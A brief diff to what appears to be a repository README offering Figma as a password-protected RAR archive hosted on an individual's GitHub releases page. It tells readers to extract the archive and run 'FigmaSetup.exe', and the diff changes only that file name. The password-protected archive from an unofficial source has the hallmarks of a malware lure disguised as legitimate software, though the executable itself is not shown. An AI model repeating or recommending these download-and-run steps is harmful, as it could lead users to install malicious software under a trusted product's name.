@@ -4,7 +4,7 @@ archive passw0rd: 321321
 
 📥 Download → [here](https://github.com/KiluanMerfi/figma/releases/download/figma/Figma.rar)
 
-Unpack the archive after download! Right-click the .zip file → "Extract All" → Open extracted folder → Run "Figma_Setup.exe"
+Unpack the archive after download! Right-click the .zip file → "Extract All" → Open extracted folder → Run "FigmaSetup.exe"
 
 🌟 Key Features:
 - Real-time collaborative design
